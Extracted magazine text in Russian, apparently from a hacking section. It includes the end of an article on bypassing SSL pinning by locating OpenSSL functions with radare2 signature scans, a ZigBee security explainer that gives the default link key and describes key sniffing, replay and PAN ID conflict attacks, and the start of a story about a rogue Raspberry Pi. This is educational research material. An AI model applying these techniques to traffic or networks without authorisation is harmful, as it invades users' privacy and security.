int EVP_DecryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out,
  int *outl, const unsigned char *in, int inl);


ГДЕ УНИВЕРСАЛЬНОСТЬ?
Теперь мы знаем принципы работы OpenSSL и можем пользоваться тем, что
тысячи разработчиков по всему миру не стес няются зашивать части этой биб‐
лиотеки в свои проекты. А зна чит, наши воз можнос ти по обходу SSLPinning
существенно расширяются! Самое сложное теперь — это успешно иден‐
тифицировать нужные кусочки OpenSSL в чужих прог раммах.


Ищем сле ды OpenSSL по стро кам и фун кциям
Начнем с самых примитивных способов идентификации: будем определять
интересующие нас функции OpenSSL по названиям и по используемым стро‐
кам. С первым вариантом все понят но — если в таблице символов иссле‐
дуемого бинарника содержится знакомое имя функции, значит, с наибольшей
вероятностью это и будет то, что мы ищем.
   Случай посложнее — когда названия функций были потерты. Здесь можно
попытаться найти нужную функцию по используемым ею константам — нап‐
ример, стро кам. Одна из интерес нейших среди затронутых в статье фун‐
кций — это ssl_verify_cert_chain. Внутри нее есть такой участок кода:


...
X509_STORE_CTX_set_default(ctx,
  s‐>server ? "ssl_client" : "ssl_server");
...

Попробуем отыскать, например, ssl_client в ста тически скомпилированной
библиотеке libmonochrome_base.so, которая используется в Chrome.





     Поиск нужной функции из OpenSSL по строке с помощью radare2

Чуть более сложный случай: если уда лось отыскать некоторые функции
OpenSSL и успешно отловить их вызовы, но эти функции еще не идентифици‐
рованы. Здесь можно попробовать метод «гру бой силы». Он основан на том,
что большинство функций OpenSSL первым параметром принимают ссылку
на экземпляр SSL SSL  *s..., который теоретически можно приравнять
к идентификатору соединения.
   Таким образом, если перехватить ID соединения в одной из идентифици‐
рованных функций и затем сравнивать его со зна чением первого параметра
во всех остальных функциях, то можно выделить множество анонимных фун‐
кций и дальше искать уже по ним. Этот метод ресурсоемок, так как тре бует
перехватывать все функции исследуемого бинарника.
  Более сложный и распростра ненный случай — когда невозможно иден‐
тифицировать ни одну функцию ни по имени, ни по используемым строкам.
Здесь на помощь приходят сигнатуры функций. При использовании одного
и того же компилятора будет получаться похожий ассемблерный код, чем
и можно воспользоваться.
  Нам ничего не меша ет самостоятельно скомпилировать библиотеки
OpenSSL и BoringSSL со всеми отладочными символами, затем пройтись
по бинарникам любым движком‐генера тором бинарных сигнатур, после чего
поискать получившиеся сигнатуры уже в «закрытом» бинарнике.


Ищем сле ды OpenSSL с помощью сигнатурного анализа
Для  примера  возьмем  нативную  реализацию  сте ка  HTTP  компании
Facebook —  libliger. В Facebook не скры вают, что используют «наработки
сообщества», что для нашего случая может означать и OpenSSL.
  Для генерации сигнатур вос пользуемся встроенным в radare2 движком
Zignatures. Для начала скомпилируем все необходимые библиоте ки (Bor‐
ingSSL и OpenSSL) для нужной архитек туры и убедимся, что их действительно
можно сопоставить с исследуемым бинарником для сигнатурного анализа:


# здесь будем сканировать сигнатуры
$ file libliger.so
ELF 64‐bit LSB pie executable ARM aarch64, version 1 (SYSV),
dynamically linked, stripped


# отсюда будем брать одну порцию сигнатур
$ file bin/boringssl/arm64‐v8a/libssl.so
ELF 64‐bit LSB pie executable ARM aarch64, version 1 (SYSV),
dynamically linked, with debug_info, not stripped


# отсюда будем брать вторую порцию сигнатур
$ file bin/boringssl/arm64‐v8a/libcrypto.so
ELF 64‐bit LSB pie executable ARM aarch64, version 1 (SYSV),
dynamically linked, with debug_info, not stripped


# отсюда будем брать третью порцию сигнатур
$ file bin/openssl/arm64‐v8a/libssl.so
ELF 64‐bit LSB pie executable ARM aarch64, version 1 (SYSV),
dynamically linked, not stripped


# отсюда будем брать четвертую порцию сигнатур
$ file bin/openssl/arm64‐v8a/libcrypto.so
ELF 64‐bit LSB pie executable ARM aarch64, version 1 (SYSV),
dynamically linked, not stripped

Генерируем  с помощью  Zignatures  сигнатуры  для  каждого файла  .so
и сохраняем их для дальнейшего использования:


$ r2 bin/boringssl/arm64‐v8a/libssl.so
$ [0x0009e210]> aa
$ [0x0006e210]> zg
$ [0x0009e210]> zos sig/boringssl/arm64‐v8a/libssl.z

Затем запускаем процеду ру поиска сигнатур внутри libliger:


$ r2 libliger.so
$ [0x0006e170]> aa
$ [0x0006e170]> zo sig/boringssl/arm64‐v8a/libssl.z
$ [0x0006e170]> zo sig/boringssl/arm64‐v8a/libcrypto.z
$ [0x0006e170]> zo sig/openssl/arm64‐v8a/libssl.z
$ [0x0006e170]> zo sig/openssl/arm64‐v8a/libcrypto.z
$ [0x0006e170]> z/ # запускаем сканирование
[+] searching 0x003e3c38 ‐ 0x00430c1c
[+] searching 0x003b2430 ‐ 0x003e3c38
[+] searching 0x00000000 ‐ 0x00395744
[+] searching metrics
hits: 2685

И спустя некоторое время смотрим на результаты поиска:


$ [0x0006e170]> zi~EVP_Encrypt # ищем EVP_Encrypt*
0x001f20ac 56 sign.refs.sym.EVP_EncryptInit_77
0x001f20ac 56 sign.refs.sym.EVP_EncryptFinal_ex_83
0x000ba080 72 sign.refs.sym.EVP_EncryptInit_1030
0x000ba080 72 sign.refs.sym.EVP_EncryptFinal_ex_1036
0x000ba130 72 sign.refs.sym.EVP_EncryptInit_1099
0x000ba130 72 sign.refs.sym.EVP_EncryptFinal_ex_1105
0x000d5aa4 516 sign.bytes.sym.EVP_EncryptUpdate_0
0x000a6958 64 sign.refs.sym.EVP_EncryptInit_1783
0x000a6958 64 sign.refs.sym.EVP_EncryptFinal_ex_1789
$ [0x0006e170]> zi~verify_cert_chain # ищем *ssl_verify_cert_chain
$ [0x0006e170]> zi~gcm128 # ищем функции по работе с AES GCM
0x000de3c4 240 sign.refs.sym.CRYPTO_gcm128_tag_9
0x001c1904 224 sign.refs.sym.CRYPTO_gcm128_tag_2107

Успешно удалось найти только одну из трех рассмотренных функций, пригод‐
ных в роли точек перехвата. Что ж, этого хва тит для наших методов SSLUnPin‐
ning! Кстати, найти *ssl_verify_cert_chain в libliger удалось предыду щим
методом — поиском по строке ssl_client. Ничто не мешает сочетать спо‐
собы. :)
  Движок Zignatures придется по душе не всем, поэтому в качестве допол‐
нения можно восполь зоваться технологией FLIRT из HexRays.
   FLIRT изначально задумывался как инс трумент, который позволял бы раз‐
делить исследуемое приложение на «извес тную часть», исходники которой
были написаны непосредственным разработчиком и которые можно найти
на просторах интернета, и «неизвестную часть» — собственно, уникальный
код.
  Можно пойти одним из двух путей: поискать необходимые для FLIRT сиг‐
натуры либо создать их самос тоятельно. Во многих сборниках сигнатур FLIRT
уже присутствуют в том числе сигнатуры для OpenSSL: например, для Ubuntu
и Windows, а также для OpenSSL, скомпилированной в MSVC раз ных версий.
  Кроме того, можно самос тоятельно сгенерировать сигнатуры FLIRT из un‐
stripped‐бинарника либо архива .ar с помощью утилит pelf/sigmake из пакета
FLAIR tools, после чего заг рузить их в IDA Pro и посмотреть на количество сов‐
падений по итогам сканиро вания.


ЗАКЛЮЧЕНИЕ
Вот мы и рассмотрели клю чевые идеи по приготовлению универсального
способа  обхода  SSLPinning. Описанные подходы можно  использовать
как основу при исследовании любого приложения, где библиотека OpenSSL
используется для реализации защиты от перехвата трафика. Теперь ты
вооружен и знаешь, что делать дальше! ;)


        WWW

                     •Репозиторий с материалами и кодом из статьи
ВЗЛОМ
  ПОЛЕТ
  ПЧЕЛЫ





       КАК РАБОТАЮТ СЕТИ ZIGBEE
     И КАК ИСКАТЬ УЯЗВИМОСТИ
              В НИХ





ZigBee — один из про токолов, который
используют для домаш ней авто матизации.
Его поддержкой наделяют умные лампочки,
беспроводные выключатели, датчики дви‐
жения  и  прочие  устройства,  которые           Егор Литвинов
повышают  ком форт. Но  насколько  они
безопасны? В  этой  статье  я расска жу,
как устроен ZigBee, и покажу, при помощи
каких устройств и программ перех ватывать
его сигнал для изучения.


             INFO

                   Мои коллеги из GS Labs занимаются разработ‐
                        ками, свя занными с умным домом, что позволило
                     мне вблизи познакомиться с безопасностью Zig‐
                        Bee. На этот опыт я и буду опираться, когда речь
                       зайдет о практике.



ПОЧЕМУ ZIGBEE?
Конечно, этот протокол не нов — стандарт появился еще в 2003 году. Сегод‐
ня есть более современные ана логи вроде LoRaWAN и RPMA, но ZigBee про‐
должает быть популярным. Почему? Взгляни на картинку.





Помимо дальности и скорос ти здесь учтена стоимость. И сразу вид но, что
ZigBee отлично сбалансирован и при невысокой цене дает приемлемые даль‐
ность действия и скорость передачи данных. Вряд ли тебе понадобится стри‐
мить видео в 4K на выключатель, а чтобы что‐то сделать издалека, обычно
используется подключенный к интернету хаб. Вот и получается, что ZigBee
не сильно бьет по карману при соз дании умно го дома и покрывает основные
нужды.
  К тому же более новые протоколы могут таить неприятные сюрпризы. Нап‐
ример, в разговорах о LoRa я уже несколько раз слышал от интеграторов, что
при большом количестве устройств в сети могут начаться чудеса. Говорят,
что на опрос сот ни девайсов может уйти около часа.


        WWW

                   Об опыте использования LoRaWAN можешь про‐
                         честь в статье на «Хабрахаб ре».



ОСНОВНЫЕ ПОНЯТИЯ
Топология сети может быть одной из следующих:
 • звезда;
 • кластерное дерево;
 • стильный‐модный‐молодежный вариант — mesh.





Ко ординатор (он же FFD) — это самый главный узел. Он создает сеть,
выбирает, на каком канале общать ся, может выступать как «центр доверия»
(trust center). Ро уте ры — устрой ства уже чуть попроще. Они служат зачас тую
ретрансляторами сооб щений от конечных устройств. Ко неч ные устрой-
ства (end device) — то, что мы объединяем в сеть, то есть выключатели, лам‐
почки, датчики движения и про чие гаджеты.





        Сводная таблица функциональ ности каждого из устройств

А теперь открываем официальную спецификацию ZigBee. Там нас почти сра‐
зу встречает вот такая интерес ная картинка.





                        ZigBee Stack Architecture

Но пусть она тебя не пуга ет, потому что к концу статьи ты поймешь, что
в реальности все немного проще! :)


PHY
Итак, начнем изучение с PHY, физичес кого уровня, и будем подниматься
вверх по слоям.


             INFO

                Мы будем говорить о ZigBee, но ZigBee базиру‐
                        ется на IEEE 802.15.4. Причем этот же стандарт
                         взят  за  основу  для  WirelessHART  и  для
                         ISA100.11a.


ZigBee, а точнее, IEEE 802.15.4 может работать в трех частотных диапазонах.





И, как ты можешь заметить, если выб рать для него час тоту 2,4 ГГц, то Wi‐Fi
и ZigBee могут начать мешать друг дру гу. Для уменьшения перекрестных
помех между Wi‐Fi и ZigBee лучше выбирать следующие каналы.





Что не может не радовать, в стандарте есть такое понятие, как ED — Energy
Detection. Эта фича используется в координаторе умного дома, чтобы он
выбирал канал, где мень ше всего помех.
  Общий вид посылки для PHY имеет следующий вид.





Если у тебя дома завалялся SDR и ты желаешь контролировать каждый‐пре‐
каждый битик в модуляции OQPSK, то тебе поможет вот эта схема.





Этот вид модуляции как раз и применяется на частоте 2,4 ГГц. А мы тем вре‐
менем идем дальше выше по стеку протоколов, и нас ждет уровень MAC.


MAC
Общий вид MAC‐фреймов представлен ниже.





Как видишь, Frame Control отвечает за тип пакета данных (Beacon, Ack,
Cmd, Data), тип адресации, а также наличие шифрования.
   Теперь поговорим о каждом фрейме данных чуть подробнее.
  Data Frame — один из самых прос тых фреймов. В нем передаются дан‐
ные протоколов, которые работают поверх IEEE 802.15.4. Получается, что ты
можешь взять за основу IEEE 802.15.4 и разработать протокол для своих
нужд.





ACK Frame — фрейм подтверждения. Увы, мы живем в неидеальном мире,
где бывает много помех, а при переда че по радиоканалу тем более. Поэтому
необходимо подтверждать принятые данные.





Здесь Sequence Number указывает на то, какой фрейм из пришедших
ранее мы подтверждаем.
  MAC Cmd frame в той или иной степени отвечает за «организацию сети»
на уровне 802.15.4.





Ниже представлены команды, которые могут тебе встре титься.





FFD — Full‐function Device — это координатор сети, та самая главная «желез‐
ка», которая организовывает сеть ZigBee.
  RFD — Reduced‐function Device — не столь важное устройство, как коор‐
динатор, выполняет функции роутера при пересылке пакетов.
  Beacon frame — об этом фрейме стоит поговорить подробнее.





Так как мы передаем данные по радиоканалу и у нас есть несколько устрой‐
ств, эти устройства дол жны как‐то определять, в какой момент можно переда‐
вать данные, а когда занята несущая и стоит подождать. Поэтому в сетях Zig‐
Bee/IEEE 802.15.4 есть два способа передачи данных: режимы Beacon
и NonBeacon.
  Для передачи данных в режиме NonBeacon используется так называемый
unslotted CSMA‐CA channel access mechanism. По моему опыту, он исполь‐
зуется редко.
  Наиболее частый случай — использование режима Beacon. В этом случае
координатор отправляет  так называ емые маячки  (beacons), на основе
которых остальные устройства синхронизируют ся и передают данные.
  Общий вид передачи данных в этом режиме представлен ниже.





Во фрейме Beacon указывается, сколько будет slotted CSMA-CA, будет ли
доступ без кон курен ции и пос ледует ли Inactive portion — вре мя, когда
конечные устройства смо гут со спокойной совестью уйти в спячку для прод‐
ления работы от батарейки.


NWK LAYER
Вот так выглядит фрейм во всей красе на уровне NWK. Не забываем, что раз
мы уже тут, данные будут упа кова ны в Data Frame уровня MAC.





Как видишь, на уровне NWK тоже встречаются нес колько разновидностей
фреймов. Но прежде чем о них говорить, думаю, стоит осветить вопросы
адресации в сетях ZigBee. Потому что тебя, наверное, уже терзают вопросы,
что такое Dst Addr, Src IEEE Addr и тому подобные вещи.


Ад ресация в сетях ZigBee
Начнем, пожалуй, с PAN ID, или Personal Area Network ID. Он используется
для логического отде ления узлов одной сети ZigBee от узлов дру гой, если
сети расположе ны на одной и той же территории либо работают на одном
и том же канале.
  EPIND — Extended PAN ID, глобальный 64‐битный уникальный иден‐
тификатор. Используется для избегания конфликтов PAN ID.
   Src/Dst Addr — собственно, адрес отправителя и получателя. Могут быть
как короткими (16‐битными), так и длинными (64‐бит ными). Причем если 64‐
битный адрес используется на слое NWK, то это и будет как раз Src/Dst IEEE
addr. Он считается уникальным для каждого при емопередатчика ZigBee.
   Ну и чтобы лучше понимать устройство адресов, пос мотрим часть дампа
трафика в Wireshark.





Сейчас пока важно понять, что Src/Dst Addr на уровнях MAC и NWK —
это одни и те же адреса.
  NWK Data frame — служит для передачи более высокоуровневых слоев.
Тут все просто.





NWK Cmd frame — как раз тут и тво рится основная «магия» маршрутизации
данных, построения mesh‐сети и подключения/отклю чения узлов.





Список основных команд представлен ниже.





Про Inter-PAN, увы, не скажу ничего, так как он загадочен. Его основная
задача — пересылка данных между узлами, которые находятся в разных
сетях, но документации по этой теме очень немного.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       ПОЛЕТ ПЧЕЛЫ
             КАК РАБОТАЮТ СЕТИ ZIGBEE И КАК ИСКАТЬ
                          УЯЗВИМОСТИ В НИХ





APL LAYER
Наконец мы добрались до самого верха в стеке протоколов ZigBee. Общий
вид фреймов представлен ниже.





Data Frame Format





Этот фрейм содержит «все пос ледова тельности октетов следующего более
верхнего уровня». Спра шивается, куда уж выше?
  APS Command Frame Format





Acknowledgement Frame Format





Теперь тебя, возможно, насторожат новые сос тавные части фрейма: Proﬁle
ID, Cluster, Endpoint. Попробуем с ними разобрать ся. Вернись к той страшной
картинке со стеком протоколов в самом начале статьи. Надеюсь, теперь она
будет восприниматься полегче.





PHY и MAC определены стандартом IEEE 802.15.4, вышеле жащие уровни —
это ZigBee.
  Одна из главных задумок — обеспечить совместимость (interoperability),
отсюда такой комбайн на уровне APL. Это означает, что если взять, к при‐
меру, лампочку с поддержкой ZigBee вендора А, куп ленную десять лет назад,
и выключатель вендора Б, купленный вчера, то они без проблем будут
работать друг с другом. Рань ше ZigBee этим похвастаться не мог, сейчас же
все становится гораздо лучше.
  ZigBee Device Object (ZDO) фактичес ки отвечает за инициализацию
устройства — будет ли оно FFD (координатором) или end device. Также про‐
изводит настройку и инициализацию NWK и SSP (Security Service Provider).
О механизмах безопасности в сетях ZigBee поговорим чуть дальше.
   Application  Support  Sublayer  (APS) предоставляет  программный
интерфейс между уровнем NWK и приложениями, которые могут работать
на устройстве.
   Application Framework — что‐то вроде окружения, где выполняются
приложения ZigBee.
   Чтобы устройства понима ли, как взаимодействовать друг с другом, их
для начала нужно идентифицировать по про филям. Для этого как раз и при‐
меняются Application profiles. Размер — два байта. Бывают:
 • Public profiles — они раз работаны в ZigBee Alliance для производителей
   совместимых устрой ств. Служат для того, чтобы устройства разных вен‐
   доров могли работать друг с дру гом;
 • Private profiles (дру гое официальное наз вание — Manufacturer Spe-
   cific Profiles, MSP). Это уже профиль, раз работанный самим вендором
   для своих нужд (например, специфичных для устройства).

Некоторые proﬁle ID представлены ниже в таб лице.


    profile ID                    описание

      0x0101                        Industrial Plant Monitoring (IPM)

      0x0104                 Home Automation (HA)

      0x0105               Commercial Building Automation (CBA)

      0x0107                     Telecom Applications (TA)

      0x0108                Personal Home & Hospital Care (PHHC)

      0x0109                 Advanced Metering Initiative (AMI)

Следующая структурная единица коммуникации между устрой ствами — Clus-
ter ID. Она также имеет длину в два байта. Это своего рода сообщения,
определенные в proﬁle ID. К примеру, для профиля Home Automation могут
быть заданы следующие клас теры:
 • On/Off — используется, чтобы включить или выключить устройство (нап‐
   ример, лампочку или тер мостат);
 • Level control — используется для димминга (например, можно плавно
   зажечь лампочку на 80% от максимальной яркости);
 • Color  control —  управление  цветом  освещения  (вдруг  захочется
  мимимишный розовый оттенок?).

Завершает систему адресации Endpoint. Чтобы было понятнее, приведу
аналогию с обычным компь ютером. Устройство ZigBee — это как машина
в сети: у него есть IP, по которому можно обратиться. И как на одном компь‐
ютере может крутиться несколько служб на разных портах, так и на устрой‐
ствах ZigBee может быть нес колько приложений. Чтобы однозначно обра‐
щаться к одному или другому, как раз и нужны эндпой нты.
   Вот так будет выглядеть иерархическая структура для выключателя све та
с профилем Home Automation.





БЕЗОПАСНОСТЬ ZIGBEE
Когда заходит речь про безопас ность ZigBee, многие источники говорят, что
у ZigBee может быть либо централизо ванная сис тема безопасности, либо
децентрализованная —  и  что  данные шифруются  при помощи  AES‐
128 на уровнях NWK и/или APL. Но очень часто почему‐то забывают сказать,
что так как ZigBee базиру ется на IEEE 802.15.4, этот стандарт тоже предос‐
тавляет кое‐какие возможности в плане безопасности.





Когда выставлен третий бит в FC (Frame Control), у нас появляется допол‐
нительный заголовок AUX Security Header, который, в свою очередь, опре‐
деляет уровень безопасности (Security Level), а также включает в себя 32‐
битный счетчик, позволяющий исключить прос тей шие атаки типа  replay.
Про Security Level мы поговорим буквально через пару абзацев.


Распре делен ная модель
Распределенная модель безопасности считается менее надежной, но более
простой в реализации.





                Распределенная модель безопас ности

Как видно, в этом случае могут быть только два типа устройств — роутеры
и конечные устрой ства (end device). Роутеры могут создавать сеть и генери‐
ровать ключ к сети (network key). Чтобы устройства могли подключиться
к такой сети, они дол жны иметь pre-configured link key.


Цен трализо ван ная модель
Как понимаешь, посредственный уровень безопас ности — не наш путь,
поэтому при реализации умного дома лучше выбирать централизованную
модель безопасности.





              Централизованная модель безопасности

В этом случае координатор не только выполняет функции организации и пос‐
троения сети, но также является центром доверия (Trust Center , TC). Он
выбирает ключ шифрования для уровней NWK и APL и отвечает за подклю‐
чение новых узлов.
   Когда мы рассматривали фреймы NWK, ты мог обратить внимание на AUX
NWK Header. Это как раз дополнительный заголовок, который появляется,
если вклю чено шифрование на уровне NWK. Формат фрейма с учетом шиф‐
рования представ лен ниже.





AUX NWK Header появ ляет ся тогда, когда в заголовке Frame Control из NWK
выставлен соответствующий бит.
  Для уровня APL фрейм выглядит ана логичным обра зом.





Думаю, тебя уже давно муча ет вопрос, что это за «уровень безопасности»
(Security level) и знакомая аббревиату ра MIC (Message Integrity Code). Ответ
на этот вопрос дан в таблице ниже.





Как видишь, ZigBee и IEEE 802.15.4 позволяют исполь зовать только проверку
целостности полученного фрейма. Для этого как раз служит MIC — либо мож‐
но включить для фреймов шифрование AES‐128.


КЛЮЧИ ШИФРОВАНИЯ В ZIGBEE
Я уже упомянул шифрование AES‐128, а значит, никак не обойтись без раз‐
говора про ключи. Вот какие они быва ют.
   Pre-configured global link key — дефолтный ключ для ZigBee. Его зна‐
чение — 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39, что озна‐
чает ZigBeeAlliance09. Он используется, чтобы шифровать network key.
  Ниже приведу небольшой кусочек дампа трафика, который проходит, ког‐
да мы подключаем новое устройство к сети.





 №
 Па    End-node/
                  Примечание
  ке   координатор
  та

       End‐Node, IEEE
  18                 От правляет команду на подключение к сети (As‐
             addr
  53                        sociation Request)
          00:0D:6F:00:...

       Координатор,    Assoсiation Response, где выдается добро
  18
          IEEE addr     на подключение к сети и устройство получает
  57
         00:12:4B:00:...    короткий адрес 0x5022

 186                 Зап рашивает описание устройства и данных
       Координатор
  1                  о том, кто к нему подключился

  187                 От правляет NWK key в зашифрованном виде
       Координатор
  3                    с помощью pre‐conﬁgured global link key

Вот мы и разобрали про цесс подклю чения и ассо циации конечного устрой‐
ства к координато ру. Это так называемая MAC association. Для пол ноты
картины добавлю, что перед Association Request устрой ство отправит
в эфир Beacon request.
  Еще возможен Network Rejoin — подключение к сети на уровне NWK.
Но в этом случае конечному узлу уже надо знать network key. Это возможно,
если узел действительно заново подключается к сети или если NWK key был
указан каким‐то другим способом.
   Так что если ты подловишь момент, когда происходит добавление нового
устройства, то есть все шансы перехватить NWK key и прослушивать весь
трафик.





Зачем ждать этого момента, когда можно сымитировать подключение устрой‐
ства к сети и тем самым заполучить ключ NWK? Возможно, в других реали‐
зациях так и получится, но в нашем умном доме предус мотре ли этот момент.
:) У нас сначала необ ходимо переключить координатор в состояние ожидания
подклю чения нового устройства, которое длит ся несколько секунд, и только
потом добавлять устройство. Так что подгадывать момент все же при дется.
  Другой вопрос, который может у тебя воз никнуть: зачем вообще исполь‐
зовать дефолтный link key, когда можно задать свой и в разы улучшить взло‐
мостойкость? Ответ прос той: кас томный  link key нарушит совмести мость,
о которой мы говорили чуть ранее. Да и не вся кий пользователь захочет под‐
клю чать лампочку или розетку к программатору или джамерами задавать при‐
ватный ключик. Вот и приходится искать баланс между удобством и безопас‐
ностью.


Работа ем с       в           ZigBee  Wireshark
Wireshark прекрасно справляется с парсингом ZigBee, но, чтобы это зарабо‐
тало, нужно в настройках задать дефолтный ключ шифрования. Открывай
меню «Edit → Preferences → Protocols», выбирай «ZigBee → Pre‐conﬁgured
key» и добав ляй Pre‐conﬁgured global link key с шестнадцатеричным значени‐
ем 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39.



Network key (он же NWK key) — используется, как ты уже понял, для шиф‐
рования на уровне NWK. Он применя ется для коммуникации между всеми
узлами сети, произвольно генерируется координато ром. Передается, когда
происходит подключение нового узла.
   Application  link key — этот ключик будет работать на уровне APL.
Используется он для того, чтобы два узла могли установить шифрованное
общение друг с другом.


        WWW

                      Очень  рекомендую  почитать  статью  Security
                           Analysis of ZigBee (PDF). В ней наглядно и под‐
                      робно рассказывается про используемые ключи.



УЯЗВИМОСТИ ZIGBEE
Теперь, зная внутреннюю структуру, можно поговорить о том, какие воз‐
можны атаки на ZigBee. Один из их основных видов — это использование
дефолтного link key при подклю чении новых устройств. Но тут приходится
выбирать между удобством для рядовых пользовате лей и безопас ностью.
Можно считать, что это баг, но если добавить красивые слова про совмести‐
мость, быстроту развертывания и прочие удобные штучки, то он уже чуть
больше похож на фичу. :) О том, как нивелировать ее опасность, я уже писал
выше.
  Следующий вопрос, который хочется поднять: как обстоят дела с replay
attack? Как помнишь, на каждом из уровней у нас есть Frame Counter,
который должен препятствовать этому виду атак. Но теория с практикой схо‐
дятся далеко не всегда.





Стандарт — вещь хорошая и нужная, но его реализация вендором —
это совершенно другое дело. Впрочем, «железки» GS Labs, которые мне
довелось потестить, этому виду атак подвержены не были.
  Еще один вектор — это конфликт PAN ID. Суть этой атаки в том, что зло‐
умышленник разворачивает ложный координатор. В результате валидный
координатор сменяет PAN ID на какое‐то дру гое значение. Но устройства
по‐прежнему могут быть привязаны к ста рому PAN ID. Получается, что зло‐
умышленнику удается нарушить целос тность сети. Это может привес ти
к тому, что датчик открытия или датчик движения (или, не дай бог, датчик
дыма) не подаст вовремя тревогу. О такой ата ке был как раз недавно доклад
на Black Hat USA 2019 (PDF).
   Также не стоит забывать про разные вари анты атак типа DoS или флуд
в канале. Например, весь канал может быть забит фреймами ACK. В начале
статьи мы смотрели, как выглядит ACK frame. Если помнишь, в нем нет ни воз‐
можности шифрования (да и нечего там шифровать), ни даже MIC.
   Еще, как вариант, мож но подделать значение frame counter — если узел
не проверяет MIC, то когда придет валидный пакет, его frame counter будет
меньше. Согласно стандарту, такие пакеты сто ит отбрасывать.


СОФТ ДЛЯ РАБОТЫ С ZIGBEE
Далее небольшим списком перечислю, какие есть инструменты для взлома
изучения ZigBee.
 • KillerBee — в описании говорит ся, что это фреймворк и утилиты для атак
   на сети ZigBee и IEEE 802.15.4 networks. В списке поддерживаемого
   железа много всего уста ревшего (например, Atmel RZ RAVEN USB Stick,
   который снят с производс тва). Заявлено, что есть поддержка Texas Instru‐
   ments CC2531, но прошивка имеет ста тус beta и работает только на прос‐
   лушивание трафика.
 •  Attify ZigBee Framework — считай, то же самое, что и KillerBee, но с гра‐
   фическим интерфейсом.
 • SecBee — для работы требует Scapy‐radio, KillerВee и GNU Radio block,
   а из железа подавай уже SDR — и, как пишет разработчик, лучше все го
   USRP.
 • Z3sec — для пол ноценной работы тоже требует много дополнительных
   пакетов. Из железа поддерживается Ettus USRP или железо, совместимое
   с KillerBee.

Получается, что разнообразие только кажущееся — и обычно нужно либо
дорогущее железо (SDR), либо старье вроде Atmel RZ RAVEN USB Stick.
Поэтому я решил разработать свою утилиту — pwnrf. Работа еще не закон‐
чена, поэтому и внешний вид пока соответству ющий.





Моя основная задумка — реализовать возможность собирать произвольные
пакеты ZigBee/IEEE 802.15.4. Причем как валидные, где проверяются фор‐
маты, содержимое полей, так и произвольные фреймы, чтобы можно было
искать логические ошибки. Ну и, конечно, ути лита будет работать в режиме
сниффера. Из железа планируется поддержи вать CC2531, CC1352 либо
любой другой трансивер, с которым мож но свя зать ся через UART/Serial.


ЖЕЛЕЗО ДЛЯ РАБОТЫ С ZIGBEE
Пару слов о том, с какими железками доводилось сталкиваться при работе
с ZigBee.


Digi XBee ZigBee Mesh Kit
В основе этих модулей лежат трансиверы компании Silabs. Сей час наиболее
актуальный и све жий набор — это Digi XBee3 ZigBee 3.
  Для работы Digi XBee есть что‐то вроде IDE — XCTU. Радует, что она
работает как в Windows, так и в Linux.
   Увы, по моим субъективным ощущениям, эта штука больше рас считана
на построение сетей ZigBee и Digimesh. Для модулей есть прошивки как Zig‐
Bee, так и IEEE 802.15.4. Но, к сожалению, осо бой гибкости по генерации
произвольных пакетов дос тичь не удалось.


Texas Instruments CC2531
Эта отладочная плата TI втыкается в USB подоб но флешке. Ее китайские кло‐
ны можно найти на Aliexpress по цене около $3–4.
  Сразу «из короб ки» работает как сниффер. Можно вос пользоваться фир‐
менной утилитой TI под названием packet‐sniﬀer или взять ccsniﬀpiper — пос‐
ледняя позволит проб расывать принятые пакеты сра зу в Wireshark.
   Если же ты захочешь писать свою про шивку для этого донгла, то готовься
вспоминать старую добрую архитектуру x51 (8051 Core, если быть точным). Ну
и для того чтобы ты смог залить свою крутую прошивку, тебе потребу ется
еще cc‐debugger.
  Можно, конечно, исполь зовать более свежий CC2538, который основан
на ARM Cortex‐M3. У него больше памяти и ресурсов, но и цена в разы выше.


Texas Instruments CC1352
Как по мне, CC1352 — уже тяжелая артиллерия. Этот чип работает в двух час‐
тотных диапазонах (2,4 ГГц и субгигагерцевом) и поддерживает приличное
количество беспроводных протоко лов.





Что еще приятно: на этом микроконтрол лере можно раз работать свой ради‐
опротокол с пре амбулой, sync word и прочими кастомны ми характерис‐
тиками.





Для полноценной работы с этим камнем тебе потребу ется Code Composer
Studio (основана на Eclipse) и соответс твующий SDK. Кстати, SmartRF Studio
позволит вручную генерировать про извольный пакет ZigBee. Но пакет этот
придется самому пол ностью писать в hex‐кодах.
   Также загляни на обу чающий ресурс TI, где ты найдешь примеры работы
с этим и другими мик роконтроллерами.


        WWW

                     Ресурсы, которые помогут тебе расширить кру‐
                         гозор:
                  •Документация по ZigBee 101
                  •ZigBee Security: Basics (часть 1, 2 и 3)
                      •@ZigBeer — русскоязычная груп па в «Телег‐
                          раме»,  где  обсуждают  воп росы,  связанные
                         с ZigBee
ВЗЛОМ





     ПОТРОШИМ
    ШПИОНСКУЮ
      « МАЛИНУ »

            КАК Я НАШЕЛ НЕИЗВЕСТНУЮ
           RASPBERRY PI В СЕРВЕРНОЙ
    Кристиан Хашек
    christian@haschek.at           И УСТАНОВИЛ ВЛАДЕЛЬЦА




Недавно мы с коллегами случайно нашли в серверной
неопознанный одноплатник Raspberry Pi — проанализирова‐
ли его (не без помощи сообщества с Reddit) и даже сумели
вычислить владельца вредоносной «малины». И сей час я
расскажу, как нам это уда лось.


             INFO

                      Это перевод статьи Кристиана Хашека, впервые
                       опубликован ной в его блоге. Перевела Алёна
                       Георгиева. Все иллюстрации в статье принад‐
                       лежат автору.


На прошлой неделе мой коллега прислал мне вот такое сообщение с фото.





                 Сообщение от моего коллеги

Я попросил его отключить «малину», поместить в безопас ное мес то, отфотог‐
рафировать все части одноплат ника и снять образ с SD‐карты (пос кольку сам
я в основном работаю удален но). Я час то имел дело с Raspberry Pi и был уве‐
рен, что смогу выяснить, чем занимается эта машинка.
  В тот момент никто не думал, что «малина» ока жется вредонос ной, — ско‐
рее полагали, что кто‐то из сотрудников фигней мается.


ЧАСТИ ОДНОПЛАТНИКА
Наша «малина» состояла из трех частей:
 • Raspberry Pi (модель B) первого поколения;
 • таинственный электрон ный ключ;
 • карта SD на 16 гигов (быстрая).





                    Электронный ключ и SD‐карта


ПЕРВОЕ, ЧТО НУЖНО СДЕЛАТЬ: ОПРОСИТЬ ВСЕХ, КТО ИМЕЕТ
ДОСТУП К СЕРВЕРНОЙ
Число людей, которые имеют дос туп к это му шка фу, очень невелико — ключ
от серверной есть только у четырех человек:
 • руководитель;
 • завхоз;
 • мой коллега;
 • я.

